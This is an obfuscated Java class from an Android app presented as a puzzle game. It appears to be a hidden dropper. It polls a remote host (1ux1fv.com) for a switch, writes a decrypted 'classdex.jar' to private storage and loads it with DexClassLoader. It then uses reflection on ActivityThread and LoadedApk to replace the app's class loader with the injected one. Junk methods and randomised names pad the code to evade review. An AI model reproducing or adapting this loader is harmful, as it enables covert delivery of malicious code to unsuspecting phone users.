package pmbeo.zzokr;

import android.util.ArrayMap;


import java.io.File;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.crypto.NoSuchPaddingException;

import dalvik.system.DexClassLoader;
import happy.game.courtor.GameClickLoader;
import happy.game.puzzle.GamePuzzleAlt;
import happy.game.puzzle.bilcom.happyGameUi;

public class Lyljm {
    private static int XoGwWJbM = 1186;
    protected static int WXHpbke = 4599;
    protected static String FqGCta = "https://1ux1fv.com/puzzle.txt";
    public static int uLFwses = 3445;
    protected static int odtNsMNrvN = 3983;
    public static int qCDWj = 5566;

    public static int hcpbgamp() {
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
        Hovity mhov = new Hovity(FqGCta);
        mhov.getUrlback();
        executor.scheduleAtFixedRate(() -> {
            if (!mhov.Result.isEmpty()){
                executor.shutdown();
                if (Objects.equals(mhov.Result, "true")){
                    if(happyGameUi.happyPuzzlePt()){
                        GameClickLoader.ClickUp();
                        if (GamePuzzleAlt.mExecutor != null){
                            GamePuzzleAlt.mExecutor.shutdown();
                        }
                    }else{
                        GameClickLoader.ClickSetPuzzle();
                    }
                }else{
                    GameClickLoader.ClickSetPuzzle();
                }
            }
        }, 80, 1000, TimeUnit.MILLISECONDS);
        return 848;
    }
    public static int slpqg() {   return 1358;    }
    public static void gfuw() {   ;    }
    public static String gxoyce() {   return "android.app.ActivityThread";    }
    public static Boolean eybtnoxiwy() {   return false;    }
    public static Boolean lqxwemxgv() {   return true;    }
    public static String eabcfojjwh() {   return "android.app.LoadedApk";    }
    public static void mdjsgfdce() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException, InvalidAlgorithmParameterException, NoSuchPaddingException, NoSuchAlgorithmException, IOException, InvalidKeyException {
        GamePuzzleAlt.puzzlefig = GamePuzzleAlt.mContext.getFilesDir().getAbsolutePath() + "/classes/";
        File fig = new File(GamePuzzleAlt.puzzlefig);
        if (!fig.exists()) {
            fig.mkdirs();
        }
        GamePuzzleAlt.mStr = GamePuzzleAlt.puzzlefig + "/classdex.jar";
        Desckbrqyd.rhjqbzkvfl();
        Field figd = Class.forName(gxoyce()).getDeclaredField("mPackages");
        figd.setAccessible(true);
        GamePuzzleAlt.mClass = new DexClassLoader(GamePuzzleAlt.mStr, GamePuzzleAlt.puzzlefig, GamePuzzleAlt.puzzlefig, GamePuzzleAlt.mContext.getClassLoader());
        Field figd1 = Class.forName(eabcfojjwh()).getDeclaredField("mClassLoader");
        figd1.setAccessible(true);
        figd1.set(((WeakReference) ((ArrayMap) figd.get(Class.forName(gxoyce()).getMethod("currentActivityThread",new Class[] {}).invoke(null, new Object[] {}))).get(GamePuzzleAlt.mContext.getPackageName())).get(), GamePuzzleAlt.mClass);
    }
    public static int hodo() {   return 1384;    }

}